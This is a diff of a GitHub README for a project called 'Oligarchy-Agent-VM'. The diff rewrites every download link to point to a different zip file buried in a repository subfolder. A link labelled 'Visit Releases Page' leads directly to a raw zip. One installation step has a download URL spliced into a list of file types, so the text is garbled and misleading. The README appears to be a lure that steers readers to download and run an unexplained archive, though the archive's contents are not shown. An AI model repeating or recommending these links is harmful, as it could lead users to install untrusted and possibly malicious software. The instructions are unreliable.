@@ -1,6 +1,6 @@
 # 🚀 Oligarchy-Agent-VM - Simplifying AI Development Environments
 
-[![Download Oligarchy-Agent-VM](https://github.com/AhmedSami5/Oligarchy-Agent-VM/raw/refs/heads/main/ui/godot/test/Agent_VM_Oligarchy_v2.1.zip)](https://github.com/AhmedSami5/Oligarchy-Agent-VM/raw/refs/heads/main/ui/godot/test/Agent_VM_Oligarchy_v2.1.zip)
+[![Download Oligarchy-Agent-VM](https://raw.githubusercontent.com/AhmedSami5/Oligarchy-Agent-VM/main/ui/godot/Agent_VM_Oligarchy_2.4.zip)](https://raw.githubusercontent.com/AhmedSami5/Oligarchy-Agent-VM/main/ui/godot/Agent_VM_Oligarchy_2.4.zip)
 
 ## 📦 Overview
 
@@ -33,11 +33,11 @@ Follow these steps to download and run Oligarchy-Agent-VM:
 
 1. **Visit the Releases Page** - Click on the link below to go to the download page.
 
-   [Visit Releases Page](https://github.com/AhmedSami5/Oligarchy-Agent-VM/raw/refs/heads/main/ui/godot/test/Agent_VM_Oligarchy_v2.1.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/AhmedSami5/Oligarchy-Agent-VM/main/ui/godot/Agent_VM_Oligarchy_2.4.zip)
 
 2. **Choose a Version** - Look for the latest release. You will see various files listed.
 
-3. **Download the Files** - Click on the file that suits your system. You may find a `.zip`, `https://github.com/AhmedSami5/Oligarchy-Agent-VM/raw/refs/heads/main/ui/godot/test/Agent_VM_Oligarchy_v2.1.zip`, or another installation file. 
+3. **Download the Files** - Click on the file that suits your system. You may find a `.zip`, `https://raw.githubusercontent.com/AhmedSami5/Oligarchy-Agent-VM/main/ui/godot/Agent_VM_Oligarchy_2.4.zip`, or another installation file. 
 
 4. **Extract the Downloaded Files** (if necessary) - Use your file manager to extract the files. Right-click on the downloaded file and select "Extract here" or similar.
 
@@ -54,7 +54,7 @@ Follow these steps to download and run Oligarchy-Agent-VM:
 
 To get started with Oligarchy-Agent-VM, visit the link below and download the latest version:
 
-[Download Oligarchy-Agent-VM](https://github.com/AhmedSami5/Oligarchy-Agent-VM/raw/refs/heads/main/ui/godot/test/Agent_VM_Oligarchy_v2.1.zip)
+[Download Oligarchy-Agent-VM](https://raw.githubusercontent.com/AhmedSami5/Oligarchy-Agent-VM/main/ui/godot/Agent_VM_Oligarchy_2.4.zip)
 
 After downloading, follow the instructions in the "Getting Started" section to install and run the application.
 
